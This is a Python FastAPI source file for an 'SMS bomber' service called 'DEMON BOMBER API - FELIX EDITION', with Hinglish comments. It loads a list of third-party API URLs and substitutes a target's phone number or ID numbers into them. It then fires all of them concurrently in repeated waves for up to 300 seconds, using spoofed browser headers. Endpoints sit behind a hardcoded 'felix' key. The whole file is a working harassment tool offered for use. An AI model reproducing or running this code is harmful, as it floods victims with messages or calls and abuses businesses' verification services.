# app.py - Full Power + Felix Key System
from fastapi import FastAPI, HTTPException, Query
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
import aiohttp
import asyncio
import time
import os
import re
from typing import Optional

app = FastAPI(title="🔥 DEMON BOMBER API - FELIX EDITION")

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

# ------------------ FELIX KEY SYSTEM ------------------
VALID_KEYS = ["felix", "FELIX", "Felix", "f3l1x", "F3L1X"]

def validate_key(key: str) -> bool:
    return key in VALID_KEYS

# ------------------ LOAD SIRF TERI FILE ------------------
def load_apis():
    apis = []
    try:
        with open("bomber_apis.txt", "r", encoding="utf-8") as f:
            for line in f:
                url = line.strip()
                if url and url.startswith("http"):
                    apis.append(url)
    except FileNotFoundError:
        print("❌ bomber_apis.txt nahi mili!")
        return []
    
    print(f"[+] Loaded {len(apis)} APIs from your file")
    return apis

ALL_APIS = load_apis()
print(f"[+] Total APIs: {len(ALL_APIS)}")

class BombRequest(BaseModel):
    number: str
    duration: int = 30
    key: str

# ------------------ FULL POWER BOMBER ENGINE ------------------
async def hit_api(session, url, target):
    """Single API hit - fast and furious"""
    # Sab placeholders replace karo
    formatted = url
    formatted = formatted.replace("{num}", target)
    formatted = formatted.replace("{phone}", target)
    formatted = formatted.replace("{target}", target)
    formatted = formatted.replace("{no}", target)
    formatted = formatted.replace("{NUMBER}", target)
    formatted = formatted.replace("{aadhaar}", target)
    formatted = formatted.replace("{uid}", target)
    formatted = formatted.replace("{gst}", target)
    formatted = formatted.replace("{pan}", target)
    formatted = formatted.replace("{vehicle}", target)
    formatted = formatted.replace("{ifsc}", target)
    formatted = formatted.replace("{pin}", target)
    formatted = formatted.replace("{pincode}", target)
    formatted = formatted.replace("{imei}", target)
    formatted = formatted.replace("{phone_number}", target)
    formatted = formatted.replace("{mobile}", target)
    
    # Agar koi aur placeholder bacha to replace
    formatted = re.sub(r'\{[^}]+\}', target, formatted)
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-US,en;q=0.9",
        "Connection": "keep-alive",
        "Cache-Control": "no-cache"
    }
    
    try:
        async with session.get(formatted, headers=headers, timeout=2) as r:
            if r.status in [200, 201, 202, 204, 302, 303, 307, 308]:
                return True
    except asyncio.TimeoutError:
        pass
    except:
        pass
    return False

async def run_bomber(target, duration):
    """FULL POWER - All APIs fire together continuously"""
    if not ALL_APIS:
        return {"error": "No APIs loaded! Check bomber_apis.txt"}
    
    start = time.time()
    end = start + duration
    total = 0
    success = 0
    wave_count = 0
    
    print(f"[+] Starting FULL POWER attack on {target} for {duration}s")
    print(f"[+] Total APIs in file: {len(ALL_APIS)}")
    
    async with aiohttp.ClientSession() as session:
        while time.time() < end:
            wave_start = time.time()
            
            # 🔥 ALL APIs fire together in ONE wave - SAB EK SAATH
            tasks = [hit_api(session, api, target) for api in ALL_APIS]
            results = await asyncio.gather(*tasks)
            
            wave_total = len(results)
            wave_success = sum(1 for r in results if r)
            
            total += wave_total
            success += wave_success
            wave_count += 1
            
            wave_time = time.time() - wave_start
            
            print(f"[Wave {wave_count}] {wave_success}/{wave_total} hits in {wave_time:.2f}s")
            
            # Minimal delay - full power mode
            await asyncio.sleep(0.1)
    
    return {
        "target": target,
        "duration": duration,
        "total_apis": len(ALL_APIS),
        "waves": wave_count,
        "total_requests": total,
        "successful_hits": success,
        "success_rate": round((success/total)*100, 2) if total > 0 else 0,
        "requests_per_second": round(total / duration, 2)
    }

# ------------------ API ENDPOINTS ------------------
@app.get("/")
async def root():
    return {
        "status": "🔥 DEMON BOMBER - FELIX EDITION",
        "version": "2.0",
        "apis_loaded": len(ALL_APIS),
        "source": "bomber_apis.txt",
        "auth": "Required key: felix",
        "endpoints": {
            "/bomb": "POST - Full power attack (key required)",
            "/bomb/fast": "POST - Fire & forget (key required)",
            "/apis": "GET - List all APIs (no key)",
            "/health": "GET - Health check (no key)"
        }
    }

@app.get("/apis")
async def list_apis():
    """Teri file ki saari APIs dikhao"""
    return {
        "total": len(ALL_APIS),
        "apis": ALL_APIS
    }

@app.get("/health")
async def health():
    return {"status": "online", "apis": len(ALL_APIS)}

@app.post("/bomb")
async def bomb(req: BombRequest):
    """FULL POWER ATTACK - All APIs together"""
    
    # 🔐 FELIX KEY CHECK
    if not validate_key(req.key):
        raise HTTPException(401, "❌ Invalid key! Need 'felix'")
    
    if len(req.number) < 8:
        raise HTTPException(400, "Invalid number")
    
    if req.duration < 5:
        req.duration = 5
    if req.duration > 300:
        req.duration = 300
    
    if not ALL_APIS:
        raise HTTPException(500, "No APIs loaded! Upload bomber_apis.txt")
    
    result = await run_bomber(req.number, req.duration)
    
    return {
        "success": True,
        "attack_id": int(time.time()),
        "key_used": req.key,
        **result
    }

@app.post("/bomb/fast")
async def bomb_fast(
    number: str = Query(..., description="Target number"),
    duration: int = Query(30, description="Duration in seconds"),
    key: str = Query(..., description="Auth key: felix")
):
    """FULL POWER - Fire and forget (GET/POST query params)"""
    
    # 🔐 FELIX KEY CHECK
    if not validate_key(key):
        raise HTTPException(401, "❌ Invalid key! Need 'felix'")
    
    if len(number) < 8:
        raise HTTPException(400, "Invalid number")
    
    if duration < 5:
        duration = 5
    if duration > 300:
        duration = 300
    
    if not ALL_APIS:
        raise HTTPException(500, "No APIs loaded!")
    
    # Fire in background
    asyncio.create_task(run_bomber(number, duration))
    
    return {
        "success": True,
        "message": "🔥 FULL POWER ATTACK STARTED!",
        "target": number,
        "duration": duration,
        "apis": len(ALL_APIS),
        "key_used": key
    }

# ------------------ RUN ------------------
if __name__ == "__main__":
    import uvicorn
    port = int(os.environ.get("PORT", 8000))
    uvicorn.run(app, host="0.0.0.0", port=port)
